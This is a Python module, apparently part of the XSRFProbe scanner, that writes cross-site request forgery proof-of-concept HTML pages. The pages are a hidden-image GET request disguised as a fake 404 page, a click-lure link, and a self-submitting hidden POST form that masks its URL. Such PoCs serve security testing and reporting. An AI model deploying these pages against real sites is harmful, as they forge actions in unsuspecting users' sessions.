import os
import json
import logging
from urllib.parse import urlencode

from xsrfprobe.files.config import OUTPUT_DIR

logger = logging.getLogger("PoCGenerator")

ATTRIBUTION = "<!-- Generated by XSRFProbe (https://github.com/0xInfection/XSRFProbe) -->"


def _sanitize_filename(action: str) -> str:
    if "//" in action:
        name = action.split("//", 1)[1]
    else:
        name = action
    return name.replace("/", "-").replace(":", "").replace("?", "_").strip("-")


def _hidden_inputs(params: dict) -> str:
    lines = []
    for k, v in params.items():
        lines.append(f'      <input type="hidden" name="{k}" value="{v}" />')
    return "\n".join(lines)


def _save_poc(filename: str, content: str) -> str:
    path = os.path.join(OUTPUT_DIR, filename)
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        logger.info("PoC saved: %s", path)
    except Exception as e:
        logger.error("Failed to save PoC %s: %s", path, e)
    return path


# ----------------------------------------------------------------
# P1: GET auto-submit via <img> tag (no interaction)
# ----------------------------------------------------------------
def gen_get_img(action: str, params: dict) -> str:
    qs = urlencode(params)
    full_url = f"{action}?{qs}" if qs else action
    html = f"""<html>
{ATTRIBUTION}
<head><title>CSRF GET PoC</title></head>
<body>
  <h1>404 - Page not found</h1>
  <p>The URL you are requesting is no longer available.</p>
  <img src="{full_url}" style="display:none" />
</body>
</html>"""
    return _save_poc(f"{_sanitize_filename(action)}-get-img.html", html)


# ----------------------------------------------------------------
# P2: GET link (requires click)
# ----------------------------------------------------------------
def gen_get_link(action: str, params: dict) -> str:
    qs = urlencode(params)
    full_url = f"{action}?{qs}" if qs else action
    html = f"""<html>
{ATTRIBUTION}
<head><title>CSRF GET PoC</title></head>
<body>
  <a href="{full_url}">Click here to continue</a>
</body>
</html>"""
    return _save_poc(f"{_sanitize_filename(action)}-get-link.html", html)


# ----------------------------------------------------------------
# P3: POST form auto-submit (no interaction)
# ----------------------------------------------------------------
def gen_post_autosubmit(action: str, params: dict) -> str:
    inputs = _hidden_inputs(params)
    html = f"""<html>
{ATTRIBUTION}
<head><title>CSRF POST PoC</title></head>
<body>
  <script>history.pushState('', '', '/');</script>
  <form id="csrfform" action="{action}" method="POST" enctype="application/x-www-form-urlencoded">
{inputs}
      <input type="submit" value="Submit" />
  </form>
  <script>document.getElementById('csrfform').submit();</script>
</body>
</html>"""
    return _save_poc(f"{_sanitize_filename(action)}-post-auto.html", html)


